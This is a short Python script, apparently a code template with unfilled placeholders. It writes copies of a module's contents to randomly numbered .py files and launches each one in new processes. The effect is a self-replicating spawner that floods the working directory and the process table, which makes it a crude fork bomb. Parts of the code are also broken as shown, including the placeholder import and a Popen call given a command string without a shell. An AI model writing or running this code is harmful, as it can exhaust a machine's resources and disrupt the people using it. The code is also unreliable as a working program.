import {name} as m
import random as r
import subprocess as s
import multiprocessing as mp
import os


def runFile(i):
    filename = "python " + str(i) + ".py"
    s.Popen(filename, shell=False)


def handleFile(i):
    file = os.getcwd() + "\\\\" + str(i) + ".py"
    if not os.path.isfile(file):
        m.writeFile(f"{{i}}.py", m.contents)
    runFile(i)
    print(f"Created {{i}}.py!")


def main():
    for a in range(10):
        i = r.randint(0, 10)
        if __name__ == "__main__":
            mp.Process(target=handleFile, args=(i,)).start()
            print("Hi")


main()